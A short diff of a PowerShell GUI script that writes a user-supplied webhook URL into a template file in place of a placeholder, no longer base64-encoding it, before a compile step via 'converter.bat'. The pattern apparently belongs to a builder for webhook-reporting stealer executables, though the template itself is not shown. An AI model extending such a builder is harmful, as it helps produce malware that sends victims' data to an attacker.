@@ -65,8 +65,8 @@ $button.Add_Click({
         # Read the file content and replace placeholder
         $content = Get-Content $filePath -Raw
         $webhookencode = Encode-Base64 -Text $webhook
-        $newContent = $content -replace 'YOUR_WEBHOOK_HERE2', $webhookencode
-        Set-Content -Path $filePath -Value $newContent
+        $content = $content -replace 'YOUR_WEBHOOK_HERE2', $webhook
+        Set-Content -Path $filePath -Value $content
 
         # Path to the complie.exe executable
         $compliePath = ".\converter.bat"  # Change this to the correct path
